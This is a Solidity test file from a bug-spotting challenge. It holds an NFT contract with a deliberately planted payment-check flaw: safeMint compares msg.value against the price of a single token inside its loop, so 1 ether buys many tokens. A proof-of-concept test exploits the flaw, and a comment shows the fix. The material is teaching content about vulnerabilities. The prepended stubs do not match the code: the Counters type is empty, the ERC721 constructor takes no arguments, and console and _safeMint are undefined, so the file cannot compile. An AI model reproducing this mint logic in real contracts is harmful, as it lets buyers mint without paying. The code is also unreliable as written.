// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;


// ===== AUTO-GENERATED STUBS FOR STATIC ANALYSIS =====
abstract contract Counters {}
abstract contract ERC721 { mapping(uint256 => address) private _owners; mapping(address => uint256) private _balances; function balanceOf(address owner) public view virtual returns (uint256) { return _balances[owner]; } function ownerOf(uint256 tokenId) public view virtual returns (address) { return _owners[tokenId]; } }
abstract contract Ownable { address private _owner; modifier onlyOwner() { require(msg.sender == _owner); _; } function owner() public view returns (address) { return _owner; } function transferOwnership(address newOwner) public virtual onlyOwner { _owner = newOwner; } }
abstract contract Test {}
// ===== END STUBS =====


// Immunefi #spotthebugchallenge!
// https://twitter.com/immunefi/status/1557301712549023745

contract ContractTest is Test {
    HerToken HerTokenContract;

    function testSafeMint() public {
        HerTokenContract = new HerToken();

        HerTokenContract.safeMint{value: 1 ether}(address(this), 10);
        console.log(
            "Due to incorrect check msg.value, we can mint many NFTs with 1 Eth."
        );
        console.log("NFT minted:", HerTokenContract.balanceOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        //   HerTokenContract.safeMint{value: 1 ether}(address(this),30);
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

contract HerToken is ERC721, Ownable, Test {
    uint128 constant MINT_PRICE = 1 ether;
    uint128 constant MAX_SUPPLY = 10000;
    uint mintIndex;
    using Counters for Counters.Counter;
    Counters.Counter private _tokenIdCounter;

    constructor() payable ERC721("HarToken", "HRT") {}

    function safeMint(address to, uint256 amount) public payable {
        require(
            _tokenIdCounter.current() + amount < MAX_SUPPLY,
            "Cannot mint given amount."
        );
        require(amount > 0, "Must give a mint amount.");
        //fix require(msg.value >= MINT_PRICE * amount, "Insufficient Ether.");
        // before the loop
        for (uint256 i = 0; i < amount; i++) {
            require(msg.value >= MINT_PRICE, "Insufficient Ether.");

            mintIndex = _tokenIdCounter.current();
            console.log("mintIndex", mintIndex);
            _safeMint(to, mintIndex); // no reentrancy issue, because we can not control tokenid.
            _tokenIdCounter.increment();
        }
    }
}